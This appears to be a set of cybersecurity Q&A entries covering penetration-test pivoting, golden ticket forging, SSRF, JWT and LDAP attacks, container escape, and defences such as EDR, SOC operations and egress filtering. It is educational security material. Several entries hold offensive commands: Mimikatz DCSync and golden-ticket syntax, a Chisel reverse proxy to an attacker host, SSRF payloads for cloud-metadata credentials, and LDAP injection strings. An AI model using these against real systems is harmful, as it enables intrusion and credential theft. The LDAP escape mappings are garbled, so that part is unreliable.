How do you pivot through networks during a penetration test?

Pivoting enables attacking systems not directly accessible from initial compromise. Techniques: (1) SSH tunneling: local port forward -- ssh -L 8080:internal-target:80 user@jump-host; access internal-target:80 via localhost:8080; dynamic SOCKS proxy -- ssh -D 1080 user@jump-host; then proxychains tool to route arbitrary TCP through jump host. (2) Chisel (fast TCP/UDP tunnel over HTTP): server:./chisel server --port 8080 --reverse (on attacker); client (on compromised host):./chisel client attacker:8080 R:socks (creates reverse SOCKS5 proxy at attacker:1080); use proxychains or proxifier to route tools through SOCKS. (3) Ligolo-ng: agent on compromised host connects back to attacker proxy server; creates TUN interface on attacker machine for transparent routing (no proxychains needed); best performance for interactive traffic. (4) Metasploit pivoting: route add SUBNET MASK SESSION_ID (Meterpreter); use auxiliary/server/socks_proxy; all tools via proxychains through Metasploit's SOCKS proxy. (5) Web shell pivoting: if web shell on DMZ server, upload Regeorg/neo-regeorg (SOCKS5 via HTTP POST); tunnel through web server to internal network using HTTP-based tunnel. (6) Double pivoting: pivot through two hosts to reach deep internal network: attacker -> Chisel -> DMZ host -> SSH tunnel -> internal host -> reach isolated segment. Tooling: nmap via proxychains is slow (TCP connect, no SYN); use masscan for initial discovery from pivot host directly; crackmapexec natively supports SOCKS proxy.
Explain common API authentication vulnerabilities.

API authentication vulnerabilities: (1) Missing authentication: endpoint accessible without any auth header; common in /api/internal/, /actuator/ (Spring Boot), /debug/, /admin/; test: remove Authorization header, see if still works. (2) JWT none algorithm: change alg header to none, remove signature; some JWT libraries accept it; test: split JWT, decode header, change alg to none, re-encode, send with empty signature (token.payload.). (3) JWT weak secret: HS256 with secret < 32 chars; brute-force with jwt_tool or hashcat -m 16500; common secrets: secret, password, 123456, changeme, application name. (4) API key in URL: ?api_key=KEY123; logged in server access logs, browser history, Referer headers; keys should be in headers or body. (5) API key predictability: sequential or low-entropy keys; enumerate by incrementing; md5(user_id) or similar. (6) Token not expiring: access token valid for years; if stolen, permanent access; test expiry by waiting or checking exp claim in JWT. (7) Refresh token rotation not enforced: stolen refresh token can be used indefinitely; refresh token should be invalidated after use (rotation). (8) Mass assignment on API key creation: POST /api/keys body includes permissions field not validated by server; set permissions to admin; create an API key with admin access. (9) OAuth misimplementation: see OAuth vulnerabilities section; common: missing state parameter, open redirect_uri. (10) HTTP Basic auth: credentials in base64 (not encrypted) in every request; readable if TLS not enforced; easily captured by MITM.
How do you perform network forensics after an incident?

Network forensics investigates captured packet data to reconstruct incident. Data sources: (1) Full packet capture (PCAP): requires network TAP or SPAN port; most comprehensive; limited by storage (10Gbps link generates ~1TB/day); analyse with Wireshark, NetworkMiner, Zeek. (2) NetFlow/IPFIX: flow records (source/dest IP, port, protocol, bytes, duration); metadata only, no payload; long retention possible; analyse with ntopng, Elastiflow, SolarWinds NTA; sufficient for detecting C2 beaconing, lateral movement. (3) Firewall/proxy logs: already captured in most enterprises; source, destination, URL, action, bytes. Analysis workflow: (1) Timeline reconstruction: extract all connections involving compromised IP; sort by timestamp; identify first suspicious connection (initial access). (2) C2 identification: look for regular outbound connections (beaconing) -- periodic connections at fixed intervals to same external IP/domain; filter: src_ip=compromised AND dest_port=443 AND bytes_out > 1000; plot connection times. (3) Data exfiltration: large outbound transfers to unknown external IPs; bytes_out > bytes_in by large margin; uploads to cloud storage (S3, Dropbox, Google Drive API endpoints). (4) Lateral movement: SMB connections from workstations to other workstations or servers (Event: src=workstation, dst=internal_server, port=445); look for PsExec patterns (SMB followed by service creation). (5) DNS analysis: Zeek dns.log; high NXDOMAIN rate (DGA); high query volume to one domain (tunneling); queries for unusual TLD (.top,.xyz,.bit). Tools: Zeek for structured log generation from PCAP; Rita for automated beacon detection; NetworkMiner for file carving from PCAP.
Explain how to use YARA rules for malware detection.

YARA is a pattern-matching tool for malware identification and classification. Rule structure: rule rule_name { meta: description = Detects Cobalt Strike beacon; author = analyst; date = 2024-01-01; strings: $s1 = {6D 73 76 63 72 74 2E 64 6C 6C} $s2 = ReflectiveDll $re1 = /beacon[0-9]{2}\.dll/ nocase $hex1 = {4D 5A 90 00 03 00 00 00} condition: $hex1 at 0 and ($s1 or $s2) and $re1; }. String types: plain text strings: $s = this is malicious; hex strings: $hex = {DE AD BE EF}; regex: $re = /C:\\Windows\\[a-z]{8}\.exe/. Modifiers: nocase (case-insensitive); wide (UTF-16 LE encoding for Windows strings); ascii; fullword (whole word only, not substring). Conditions: all of them (all strings match); any of ($s*) (any string starting with $s); #s1 > 5 (string appears more than 5 times); $s1 at 0 (at file offset 0); $s1 in (0..500) (within first 500 bytes); filesize < 1MB. Running YARA: yara -r rules/ malware_sample (recursive scan of directory); yara rule.yar /proc (scan running processes -- matches on memory); yara rule.yar /path/to/file. Sources of YARA rules: YARA-Forge (community rules); Signature-Base (Neo23x0/Florian Roth); VirusTotal Intelligence; malware analysis blogs publish rules for new samples. Writing effective rules: minimum false positives -- add multiple unique strings, size constraints; test against clean samples (benign files) before deploying; avoid overly generic strings (CreateFile, LoadLibrary appear in all Windows apps).
How does EDR work and what does it monitor?

EDR (Endpoint Detection and Response) monitors endpoints for threats and provides response capabilities. Data collected: (1) Process events: process creation (parent, command line, hash, signer), process termination, process injection (OpenProcess, WriteProcessMemory API calls), in-memory execution. (2) File events: file creation, modification, deletion (especially in sensitive locations: System32, startup folders, browser extensions). (3) Network events: DNS queries, TCP/UDP connections, HTTP requests (user-agent, URL) per process. (4) Registry events: key creation, value modification (Run keys, services, COM registration). (5) User events: logon, privilege use, group membership changes. (6) Module load events: DLL load per process -- detect unsigned DLL loading into signed processes. Detection approaches: (1) Signature-based: hashes, YARA rules on file content -- fast but misses unknown malware. (2) Behavioral: rules on patterns (Word spawning cmd.exe, PowerShell with encoded command, mass file encryption) -- detects unknown malware via behavior. (3) ML: anomaly detection, user/entity behavior analytics (UEBA) -- detects deviations from baseline. (4) Threat intelligence: IOC matching (known C2 IPs/domains, malicious hashes) -- immediate detection of known threats. Response capabilities: process termination; file quarantine (isolate malicious file); network isolation (cut host from network while retaining EDR connection for forensics); timeline investigation; memory dump; remote shell. Commercial EDRs: CrowdStrike Falcon, Microsoft Defender for Endpoint, SentinelOne, Carbon Black, Cortex XDR. Open source: Wazuh (SIEM/EDR hybrid), osquery (endpoint query engine).
What is a Security Operations Center (SOC) and how does it operate?

SOC (Security Operations Center): 24/7 team monitoring and responding to security events. SOC tiers: Tier 1 (L1): alert triage; investigate SIEM alerts; initial classification (true/false positive, severity); escalate to L2; 24/7 coverage; high volume, lower complexity. Tier 2 (L2): incident investigation; deeper analysis of escalated alerts; threat hunting; malware analysis; IR coordination; determine scope and impact. Tier 3 (L3): threat intel; advanced threat hunting; red team, purple team; develop new detection content; forensics on complex incidents; senior analysts. Core tooling: SIEM (Splunk, Elastic SIEM, Microsoft Sentinel, QRadar) -- centralised log aggregation, correlation rules, alerting. SOAR (Security Orchestration, Automation, Response -- Splunk SOAR/Phantom, Palo Alto XSOAR, Swimlane) -- automate repetitive tasks (IP reputation lookup, ticket creation, containment actions); playbooks for consistent response. Threat Intelligence Platform (TIP -- Anomali ThreatStream, MISP, OpenCTI) -- aggregate, analyse, distribute IOCs. Ticketing (Jira, ServiceNow) -- track incidents from detection to closure. EDR -- endpoint telemetry and response. SOC metrics: MTTD (Mean Time to Detect): time from attack to detection; target <24 hours. MTTR (Mean Time to Respond/Remediate): time from detection to containment; target <4 hours for P1. Alert volume and false positive rate (target: <10% FP rate per rule). Incidents by severity per month. SLA compliance percentage. SOC challenges: alert fatigue (too many FPs); talent shortage; attacker dwell time average 16 days (Mandiant 2023); automation is key to scalability.
What is a golden ticket attack?

Golden ticket: forge a Kerberos TGT (Ticket Granting Ticket) using the krbtgt account NTLM hash; access any service in the domain as any user including domain admin; most powerful Active Directory persistence technique. Prerequisites: krbtgt account NTLM hash (requires domain admin access to obtain); domain SID; any valid username (can be non-existent user); domain name. Obtaining krbtgt hash: DCSync attack (most common): Mimikatz: lsadump::dcsync /domain:corp.com /user:krbtgt (replicate directory as if domain controller; no logon to DC required; requires Replication Directory Changes permissions); secretsdump.py (Impacket): secretsdump.py domain/admin:pass@DC_IP (if admin access to DC); direct DC access: secretsdump.py -just-dc-user krbtgt -target-ip DC_IP or Mimikatz on DC locally. Forging golden ticket: Mimikatz: kerberos::golden /user:Administrator /domain:corp.com /sid:S-1-5-21-xxx /krbtgt:HASH /ptt; parameters: /user: any username (need not exist); /id:500 (RID of user; 500=Administrator); /groups:512,519 (group RIDs -- 512=Domain Admins, 519=Enterprise Admins); /ptt: inject into current session immediately; or save to file: /ticket:ticket.kirbi and inject later. Ticket lifetime: by default: 10 year validity; persists until krbtgt password changed TWICE (reset once + wait + reset again; KDC uses previous password for transition period). Usage: once injected: klist (verify ticket); dir \\DC\c$ (access DC admin share); psexec \\DC cmd.exe (shell on DC); or any other domain resource. Detection: event ID 4769 (TGS request): golden ticket user authenticating to services; anomalies: tickets for non-existent users (but attacker uses valid username); tickets with unusual attributes (future expiry year 2033); impossible logon (user on workstation but TGT says different); Microsoft ATA and Defender for Identity detect Kerberos anomalies; examine PAC (Privilege Attribute Certificate) -- golden tickets may have forged PAC that DCs reject if PAC validation enabled. Remediation: golden ticket = domain compromise; reset krbtgt password twice (24 hours apart per Microsoft guidance); rebuild domain or accept continued risk; all users must re-authenticate (ticket cache cleared by krbtgt reset); force logoff and re-logon all users.
What are the main types of malware?

Malware taxonomy: classification of malicious software by behaviour and purpose. Virus: attaches to legitimate file; spreads when infected file executed or opened; requires user action to spread; modifies host file; less common in modern era (replaced by worms and Trojans). Worm: self-replicating without user action; spreads via network vulnerabilities (SMB, RDP, email server bugs); famous: WannaCry (EternalBlue SMB); Morris Worm (1988, first internet worm); Conficker. Trojan (Trojan Horse): appears legitimate; contains hidden malicious payload; user willingly executes; does not self-replicate; delivery: phishing email attachment, fake software download, cracked software. RAT (Remote Access Trojan): gives attacker remote control; keylogging, screenshots, file access, webcam, microphone; examples: DarkComet, njRAT, Remcos, AsyncRAT, QuasarRAT. Ransomware: encrypts files; demands payment; most financially damaging malware type; examples: LockBit, ALPHV, Ryuk, Cl0p, WannaCry. Spyware: monitor user activity secretly; keyloggers (record keystrokes: credentials, messages); banking trojans (intercept banking transactions); stalkerware (monitor location, messages); examples: Emotet (banking trojan evolved to loader), TrickBot, Zeus. Adware: display unwanted advertisements; often bundled with free software; less malicious but disruptive; may track browsing. Rootkit: hide attacker presence; modify OS to conceal processes, files, network connections; kernel rootkit: deepest level; user-mode rootkit: hook user-space APIs; bootkit: pre-OS boot sector; UEFI rootkit: firmware level. Botnet: network of compromised hosts controlled centrally; used for: DDoS, spam, credential stuffing, cryptocurrency mining, distribution of other malware; C2 (Command and Control) infrastructure; Mirai (IoT botnet), Emotet, TrickBot. Cryptominer: mine cryptocurrency using victim compute resources; CPU/GPU intensive; electricity theft; Monero (XMR) popular (CPU-minable, private); detected by: high CPU usage, network traffic to mining pool. Dropper/Loader: first stage; downloads and executes second-stage payload; often used to deliver ransomware or RAT; Emotet, BazarLoader, GuLoader, IcedID. Fileless malware: no files written to disk; lives in memory; uses LOLBins; harder to detect; PowerShell-based, WMI-based, registry-based payload storage.
How do you perform web application reconnaissance?

Web application reconnaissance: gather information about target web application before vulnerability testing. Passive reconnaissance (no direct interaction with target): Google dorking: site:target.com (all indexed pages); site:target.com filetype:pdf (PDFs -- may contain internal info); site:target.com inurl:admin; site:target.com ext:php OR ext:asp OR ext:aspx; site:target.com intitle:login; cache:target.com (cached version); related:target.com (similar sites). Wayback Machine: archive.org: historical versions of site; find old pages (admin panels, debug features, old vulnerable functionality); see code that was once public. Certificate transparency: crt.sh; find all subdomains with issued certificates; often faster than DNS brute force; reveals subdomains not exposed via DNS. OSINT tools: theHarvester (emails, subdomains, hosts, employee names from public sources); Shodan (internet-facing infrastructure); SecurityTrails (DNS history); DNSdumpster (DNS record mapping). Active reconnaissance (direct interaction -- generate logs): subdomain enumeration: gobuster dns -d target.com -w /usr/share/wordlists/subdomains.txt; ffuf -u https://FUZZ.target.com -w subdomains.txt; amass (active + passive; very comprehensive); DNS brute force and zone transfer attempt (dig axfr @ns.target.com target.com -- usually blocked). Port scanning: nmap -sV -p 80,443,8080,8443,8888 target.com (web-specific ports); common alternative HTTP ports. Web crawling/spidering: Burp Suite spider: crawl entire application while proxying; find all links, forms, endpoints; ZAP spider; directory/file brute force: gobuster dir -u https://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt; ffuf -u https://target.com/FUZZ -w paths.txt -mc 200,301,302,403; find: hidden endpoints, backup files (.bak,.old, ~), admin panels, API endpoints, configuration files, git repos (/.git/). Technology fingerprinting: Wappalyzer browser extension; detect: web framework (WordPress, Drupal, Laravel, ASP.NET, Django), server (Apache, Nginx, IIS), language (PHP, Python, Ruby), JavaScript libraries, CMS, analytics. JavaScript analysis: download and analyse all JS files; find API endpoints, commented-out features, hardcoded credentials or API keys, internal hostnames.
What is server-side request forgery (SSRF)?

SSRF (Server-Side Request Forgery): attacker makes server fetch a URL they control; access internal resources, cloud metadata, or perform port scanning. How it works: application accepts URL and fetches it: check my profile picture at https://user-supplied-url; or webhook: notify this URL on event; or document converter: fetch URL to convert; attacker provides: http://169.254.169.254/latest/meta-data/ (AWS metadata); http://localhost/admin (internal admin); http://internal-server/api/sensitive; server fetches on behalf of attacker; response returned to attacker. Attack targets: cloud metadata: AWS: http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE (IAM credentials); GCP: http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token (access token); Azure: http://169.254.169.254/metadata/instance?api-version=2021-02-01 (requires Metadata: true header); internal services: http://localhost:8080/admin (admin panel blocked externally but accessible via SSRF); http://internal.corp.com/api/secret; port scanning: http://192.168.1.1:22/ (closed port = timeout; open port = response indicating service); enumerate internal network topology. SSRF bypasses: localhost bypass: http://127.0.0.1, http://0.0.0.0, http://[::1] (IPv6), http://0x7f000001 (hex IP), http://2130706433 (decimal IP), http://127.127.127.127 (routable to localhost via special IPs); DNS rebinding: domain resolves to allowed IP for check; re-resolves to 127.0.0.1 for actual request; URL parser confusion: http://attacker.com@169.254.169.254/ (user@host -- host is 169.254.169.254); http://169.254.169.254#@attacker.com (fragment confusion); redirect: target http://allowed.com/redirect?url=169.254.169.254 (if allowed.com has open redirect). Blind SSRF: no response to attacker; detect via DNS callback (Burp Collaborator, interactsh): attacker-controlled domain; if server makes DNS request to attacker.burpcollaborator.net: SSRF confirmed even without HTTP response. Mitigation: allowlist URLs or domains (not denylist); validate scheme (only https://); DNS resolution validation (resolve to non-private IP); use server-side proxy with strict egress filtering; block metadata IP ranges (169.254.169.254) at network level; IMDSv2 (AWS): requires PUT token before GET; SSRF without pre-auth cannot get metadata.
What are the security implications of JWT tokens?

JWT (JSON Web Token) security: stateless authentication tokens; signed to prevent tampering; common vulnerabilities if implemented incorrectly. JWT structure: header.payload.signature; header: {alg: HS256, typ: JWT}; payload: {sub: 123, role: admin, exp: 1720000000}; signature: HMAC-SHA256(base64url(header) +. + base64url(payload), secret) or RSA signature; all base64url encoded; not encrypted (payload readable by anyone; just signed). Critical vulnerabilities: Algorithm None attack: attacker changes alg: none in header; removes signature; server skips verification if accepts none algorithm; payload trusted without signature; fix: never accept none algorithm; explicitly check algorithm in code; only accept expected algorithms. Algorithm confusion (RS256 to HS256): token signed with RS256 (RSA private key); server also accepts HS256; attacker changes header to alg: HS256; signs with server public key (publicly known); server verifies HMAC using public key; public key is valid HS256 symmetric secret; attacker forges valid token; fix: never mix algorithm families; verify algorithm matches what was expected for specific key. Weak secret for HS256: HMAC secret is guessable (jwt, secret, password, 12345, company name); offline crack: hashcat -a 0 -m 16500 JWT rockyou.txt; fix: minimum 256-bit random secret; unique per application. Key ID (kid) injection: header: {alg: HS256, kid:../../dev/null}; server fetches key from filesystem using kid; null file contains empty string; sign with empty secret; or SQL injection in kid parameter; fix: validate kid is expected key identifier; do not use kid as file path or SQL query. Expiry not checked: library deserialise token; application does not check exp claim; expired tokens accepted; fix: always check exp; reject expired tokens. Sensitive data in payload: JWT payload visible to anyone; do not include sensitive data (password, full PII); claim what is needed only; if confidentiality needed: use JWE (JSON Web Encryption). Token revocation: JWTs are stateless; cannot invalidate individual token before expiry; logout just deletes client-side token; server-side: token blocklist (store revoked tokens until expiry) or short expiry (15 minutes) + refresh token pattern.
How do you perform a network penetration test?

Network penetration test: systematic external or internal assessment of network infrastructure. Scoping: external: internet-facing IP ranges; internal: specific VLAN or entire internal network; goals: demonstrate compromise, identify critical exposure, test detection capability. External network penetration test: phase 1: discovery: nmap -sn CIDR (ping sweep -- find live hosts); DNS recon (theHarvester, subfinder, amass); Shodan/Censys for exposed services; phase 2: port scanning: nmap -sV -p- --min-rate 1000 target (all ports with version detection); identify web applications, VPNs, email servers, remote access; phase 3: service enumeration: for each service: version information, banner grabbing, protocol-specific enumeration (SMB shares, SNMP community strings, FTP anonymous, SMTP relaying); phase 4: vulnerability identification: Nessus or OpenVAS credentialed/unauthenticated scan; manual CVE research for specific versions found; phase 5: exploitation: exploit vulnerabilities: public exploits (Metasploit, Exploit-DB); web application attacks on exposed apps; credential attacks (default creds, brute force with lockout awareness); phase 6: post-exploitation: establish persistence, escalate privileges, lateral movement. Internal network penetration test: assume initial access (from internal position or via compromised external asset); phase 1: network discovery: arp-scan -l (local ARP sweep); nmap -sV -p- network range; netdiscover; responder (passive capture of NTLM auth -- broadcast protocols); phase 2: Active Directory enumeration (see BloodHound entry); phase 3: vulnerability exploitation: unpatched systems, misconfigurations, credential reuse; phase 4: lateral movement; phase 5: privilege escalation to domain admin; phase 6: demonstrate impact (data access, critical system control). Tools used: Nmap, Metasploit, Impacket suite, CrackMapExec, BloodHound, Responder, Hashcat, Burp Suite for web components. Deliverables: executive summary (risk narrative); technical findings (vulnerability, evidence, CVSS, remediation); attack chain (step-by-step how domain admin achieved); remediation priorities (by risk rating); retesting options.
What is anomaly detection in security?

Anomaly detection: identify deviations from established normal behaviour; detect previously unknown attack patterns without relying solely on signatures. Approaches: statistical: model normal behaviour with statistical distribution; alert when observation exceeds N standard deviations from mean; example: user downloads 500MB in 5 minutes; normal distribution of daily download is 50MB mean 10MB SD; alert at 3 sigma = 80MB threshold; simple but effective for volumetric anomalies. Machine learning: unsupervised ML (no labelled training data needed): clustering (k-means, DBSCAN): group similar behaviour patterns; outliers = anomalies; isolation forest: isolates anomalies in random feature splits; few splits to isolate = anomaly; PCA (Principal Component Analysis): reduce dimensionality; points far from principal components = anomaly. Supervised ML (requires labelled attack data): train on labelled normal and malicious events; classify new events; challenge: labelled attack data scarce and evolves. Time-series: ARIMA, LSTM (Long Short-Term Memory): model temporal patterns; detect when pattern breaks (traffic volume, login frequency, DNS query rate). Contextual: same action normal in one context; anomalous in another; login from Paris at 8 AM: normal (office there); login from Paris same user while showing active session from New York: impossible travel (anomalous); UEBA incorporates context: time, location, device, behavioural baselines. Data sources for user anomaly detection: authentication logs (logon time, location, IP, device); endpoint telemetry (files accessed, processes, network connections); email (recipients, volume, attachments, after-hours sending); web proxy (sites visited, data uploaded, unusual categories); cloud APIs (cloud storage access, unusual API calls). UEBA products: Exabeam: risk score per user per session; timeline view of anomalous activity; Splunk UEBA: ML-based anomaly detection within SIEM; Microsoft Sentinel UEBA: integrates with AAD, endpoint, cloud logs; Securonix; Varonis (data-centric; focuses on file access anomalies). Challenges: high false positive rate at start; requires tuning period (30-90 days) to establish reliable baseline; seasonal patterns (year-end, holiday); insider threats may mimic normal (slow and low anomaly); context-aware anomaly detection more accurate but more complex.
What is DAST and how does it compare to SAST?

DAST (Dynamic Application Security Testing): test running application from outside; black-box testing; no source code required; simulate real attacker. How DAST works: crawl application (spider all pages and endpoints); submit test payloads to all inputs (URL parameters, form fields, HTTP headers, cookies, JSON body); observe responses for vulnerability indicators (SQL errors, XSS execution, path traversal disclosure); active scanning -- actually attacks running application. DAST tools: OWASP ZAP (open-source, most popular DAST): free; active and passive scanner; API testing; CI/CD integration; Burp Suite Professional: commercial; most powerful manual + automated DAST; extensions ecosystem; Rapid7 InsightAppSec: cloud-based; CI/CD integration; good for enterprise; HCL AppScan: enterprise DAST; Qualys WAS: cloud-based DAST; Nikto: basic web server scanner; Nuclei: template-based scanner (YAML templates for specific vulnerabilities); faster than traditional crawl-and-test. DAST vs SAST comparison: DAST strengths: tests actual running application (not theoretical code analysis); finds vulnerabilities SAST misses: authentication and session issues, business logic flaws, configuration issues, chained vulnerabilities, runtime issues; no source code needed (useful for black-box testing, testing third-party components); tests all languages equally (language agnostic); lower false positive rate (real HTTP response confirms vulnerability). DAST weaknesses: cannot find all code paths (only tests reachable endpoints); authentication may limit coverage (must configure with credentials); slower than SAST (full HTTP round trips vs code analysis); may miss code paths not exercised; destructive potential (active scanner may delete data, spam users -- use test environment). SAST strengths: 100% code coverage (all paths analysed); runs without deployed application (early in SDLC); fast feedback in IDE; finds: hardcoded credentials, insecure function calls, injection patterns, crypto weaknesses. SAST weaknesses: high false positive rate; language-specific tools; misses runtime issues. Best practice: use BOTH in SDLC: SAST in IDE and CI (early, fast); DAST in staging before production (realistic testing); penetration testing quarterly/annually (manual depth). IAST (Interactive Application Security Testing): instrumented application; combines SAST and DAST; agent inside running application; traces code paths exercised during DAST or functional testing; accurate, fewer false positives; requires agent support for language.
What is container escape and how do you test for it?

Container escape: attacker inside container breaks out to host OS; gains access to host file system, other containers, or host network. Why containers are not a security boundary: Docker containers share host OS kernel; kernel vulnerability accessible from container; misconfigured containers bypass intended isolation. Escape techniques: privileged container: --privileged flag: container has full host access; can mount host filesystem: mkdir /host; mount /dev/sda1 /host (access all host files as root); write to host crontab; escape to root on host. cgroup release_agent: inside unprivileged container with CAP_SYS_ADMIN: exploit cgroup v1 release_agent escape (CVE-2022-0492 and related): create cgroup; set release_agent to exploit script; generate notify_on_release; script runs on host as root; fixed in modern Docker configurations. Host PID namespace: --pid=host: container sees all host processes; inject into host processes; read process memory. Host network namespace: --network=host: container shares host network stack; sniff all host traffic; access host-bound services. Volume mounts: -v /:/hostroot (mounting host root filesystem); container runs as root; full access to host filesystem via mount. Docker socket mount: -v /var/run/docker.sock:/var/run/docker.sock: most dangerous misconfiguration; container can control host Docker daemon; create new privileged container with host filesystem mount. CAP_SYS_PTRACE: inject into any host process via ptrace; change process code or read memory. Kernel exploits: Dirty COW (CVE-2016-5195): race condition write to read-only file; write malicious code to /proc/self/mem of SUID binary; root escape; DirtyCred (CVE-2022-2588): swap credential structures; privilege escalation. Testing: check if privileged: cat /proc/self/status (check CapEff, CapPrm -- full capabilities = privileged); amicontained (tool that shows container capabilities and security features); check /proc/1/cgroup (am I in container?); check docker socket: ls -la /var/run/docker.sock; check host mounts: mount | grep host; CDK (Container DucKit): automated container escape tool for CTF and pentesting. Detection: Falco: alert on container mounting host path, exec into container, socket access from container; container security scanning: no privileged, no host PID, no host network, no dangerous capabilities, no Docker socket mount.
What is a cyber incident and how do you classify severity?

Cyber incident severity classification: determine priority and response urgency for security events. Why classification matters: limited security team resources; cannot treat all incidents equally; priority determines: escalation level (engineer, manager, CISO, board), response time (15 minutes, 1 hour, 4 hours, next business day), team mobilisation (on-call, IR firm retainer), external notification requirements (GDPR 72 hours, SEC 4 business days). Common severity tiers: P1 / Critical: immediate executive engagement; 24/7 response; examples: active ransomware encryption in progress, confirmed data breach of PII (GDPR notification triggered), active credential harvesting on production systems, complete service outage from cyberattack, nation-state APT in critical infrastructure, mass account takeover. Response: wake up CISO and CTO, activate IR firm retainer, isolate affected systems, begin forensics, notify legal for breach notification assessment. P2 / High: same day response; on-call engineer; examples: confirmed malware on production server, suspicious admin account activity, phishing campaign targeting executives, brute force attack with success indicator, exposed credentials for production system, significant data exfiltration suspected; response: investigate and contain within 4 hours. P3 / Medium: next business day; examples: phishing email clicked but no confirmed compromise, vulnerability scanner finding actively exploited CVE on internet-exposed system, suspicious behaviour but no confirmed malicious activity, DDoS attack mitigated by upstream provider; response: full investigation within 24 hours. P4 / Low: normal business hours; ticket queue; examples: vulnerability scan finding with no public exploit, spam campaign targeting employees, policy violation (USB use), failed brute force (no success); response: remediate within SLA (30-90 days). Classification criteria: data sensitivity (PII, financial, health, trade secrets = higher severity); operational impact (production outage, degraded performance, no impact = higher to lower); attacker persistence (confirmed persistence mechanism = higher); blast radius (one system, domain, all infrastructure = escalating severity); active vs past (active attack = higher; forensic investigation of old event = lower). Regulatory triggers: GDPR: personal data breach = notify DPA within 72 hours if likely high risk; SEC: material cybersecurity incident = disclose within 4 business days; HIPAA: breach of PHI = 60 days; PCI DSS: compromise of cardholder data = notify acquiring bank and card brands immediately.
How does file upload security work?

File upload security: prevent malicious file uploads that lead to server compromise, XSS, or other attacks. File upload attack types: web shell upload: attacker uploads PHP/ASP/JSP web shell disguised as image; server executes shell; full RCE; example: shell.php renamed shell.png; if server executes.php regardless of extension or if upload validation weak; client-side XSS via uploaded file: upload HTML or SVG file with embedded JavaScript; victim views uploaded file; XSS executes in site origin context; stored XSS via file metadata: EXIF metadata in image contains JavaScript or polyglot; if metadata displayed without sanitisation; server-side vulnerabilities: path traversal in filename (../../../etc/crontab); zip slip (ZIP extraction with path traversal in archive filenames); XXE in uploaded XML/SVG/DOCX; SSRF via uploaded SVG referencing internal URLs. Defence layers: validate file type: magic bytes (not extension or Content-Type from client; both attacker-controlled): imghdr library (Python), file.getBytes() first 4 bytes (Java), php: exif_imagetype() or getimagesize(); check magic bytes: JPEG (FF D8 FF), PNG (89 50 4E 47 0D 0A 1A 0A), GIF (47 49 46 38); MIME type from content (not from request header); extension check: allowlist only (not denylist):.jpg,.jpeg,.png,.gif only for images; reject.php,.php5,.phtml,.asp,.aspx,.jsp,.html,.svg,.xml; store outside web root: uploaded files should not be accessible via URL that executes them; store in /uploads/ on filesystem; serve via separate endpoint that reads file content and returns with Content-Type header; never serve uploaded files as server-executable; rename file: generate UUID filename on server; discard original filename; removes extension-based execution bypass; strip/regenerate metadata: use ImageMagick or PIL to re-encode image (mogrify -strip); removes malicious EXIF and polyglot payloads; limits to valid image data; separate domain: serve uploads from different domain (uploads.cdn.example.com vs app.example.com); XSS in upload cannot access app.example.com cookies (different origin); size and rate limits: limit file size; limit upload rate; antivirus scanning: scan with AV before storing; detect known malware; not sufficient alone but defence in depth.
What is LDAP injection?

LDAP injection: inject LDAP filter syntax into queries; modify query logic; bypass authentication or extract directory data. How it works: LDAP directory (Active Directory, OpenLDAP) queried via LDAP filter: (&(uid=USERNAME)(password=PASSWORD)); application builds filter with user input: (&(uid= + username +)(password= + password +)); attacker inputs: username=admin)(&)(; or: username=*)(uid=*))((|(a=*; filter becomes: (&(uid=admin)(&))(|uid=*))((|(a=*)(password=anything); (&) = always-true filter; authentication bypassed. LDAP filter syntax: operators: & (AND), | (OR), ! (NOT); attributes: uid, cn, mail, sAMAccountName, memberOf; wildcards: * (any characters); escape sequences: parentheses, wildcards, null bytes; authentication bypass payloads: username: * (wildcard matches any user);)(|(a=b) appended to first term (close and append always-true); injection into password field: anything)(&) making password check always true. Information disclosure: modify filter to return all objects: inject * to enumerate; filter injection to retrieve additional attributes; if query returns data: extract user accounts, group memberships, email addresses. Blind LDAP injection: application does not return LDAP data; inject True/False conditions; infer results from application behaviour (success/failure response difference); extract attribute values character by character. Tools: LDAP injection payloads in OWASP testing guide; Burp Suite manual testing; testing script: try input: * (should match all if vulnerable), admin*)((| (complex bypass),) (syntax error -- may reveal LDAP error). Mitigation: parameterised LDAP queries: Java (JNDI LDAP context): use SearchControls with literal attribute values; Python (ldap3): Connection.search() with separate filter parameters; sanitise LDAP special characters: escape: * to a, ( to 8,) to 9, \ to c, NUL to �; allowlist input: username should only be alphanumeric + limited chars; reject special LDAP characters in username; use LDAP libraries that parameterise: ldap3 attribute_value parameter handles escaping automatically.
What is egress filtering and why is it important?

Egress filtering: control and monitor outbound network traffic; prevent or detect data exfiltration, C2 communications, and malware beaconing. Default network posture problem: most organisations focus on ingress (inbound) filtering; egress often unrestricted (any internal host can connect to any internet destination); malware exploits this: any beaconing protocol works; exfiltration to any cloud storage service unrestricted. Egress filtering approach: block all outbound traffic by default; allow only explicitly required destinations and ports; strict: only web proxy outbound (port 80/443 via proxy); all other ports blocked; DNS: only to corporate DNS servers (not direct to 8.8.8.8); proxy: all HTTP/HTTPS through authenticated proxy (Blue Coat, Zscaler, Cisco WSA); proxy logs all requests; URL categorisation (block known malicious categories: C2, malware distribution); SSL inspection (decrypt and inspect HTTPS traffic -- privacy vs security tradeoff). What egress filtering prevents or detects: C2 beaconing: if malware uses uncommon port (IRC:6667, custom TCP): egress block stops it; if malware uses HTTPS to corporate-proxy-allowed sites: SSL inspection allows inspection; DNS tunneling: block direct DNS to external servers (only allow internal DNS resolver); internal DNS resolver: IOSCP inspect DNS queries; block high-volume or anomalous DNS; data exfiltration: block unapproved cloud storage (Dropbox, personal Google Drive -- if BYOD personal use needed: limit; else block); CASB (Cloud Access Security Broker): control cloud app usage; allow corporate O365/Google Workspace; block personal Gmail/Dropbox from corporate hosts; DLP on proxy: detect sensitive data patterns in outbound HTTPS (with SSL inspection). Implementation challenges: many applications expect direct internet access; breaking changes require extensive testing and exception process; SSL inspection: breaks certificate pinning (apps that pin certificates fail); user privacy concerns; legal considerations in some jurisdictions; exempt: banking, healthcare, certificate-pinning apps from SSL inspection; performance: proxy adds latency; scale proxy for all traffic; maintain exception list. DMZ egress: DMZ servers internet-facing; restrict outbound more strictly (no outbound to internal; only outbound for required services like software updates via proxy); prevents lateral movement from compromised DMZ to internal.
What are Windows Defender features for enterprise security?

Windows Defender suite (Microsoft Defender for Endpoint and related): comprehensive enterprise security platform.
